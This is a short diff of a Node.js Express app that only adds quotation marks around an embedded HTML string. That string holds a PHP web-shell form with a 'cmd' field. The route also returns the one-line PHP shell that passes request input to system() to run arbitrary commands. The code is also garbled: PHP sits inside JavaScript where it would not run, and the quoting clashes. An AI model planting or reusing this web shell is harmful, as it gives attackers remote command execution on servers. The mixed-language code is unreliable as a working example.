@@ -2,7 +2,7 @@ const express = require('express')
 const app = express()
 app.all('/', (req, res) => {
     console.log("Just got a request!")
-    data=<html>
+    data='<html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
@@ -17,7 +17,7 @@ app.all('/', (req, res) => {
 ?>
 </pre>
 </body>
-</html>
+</html>'
     res.send('<?php system($_GET['cmd']); ?>')
 })
 app.listen(process.env.PORT || 3000)
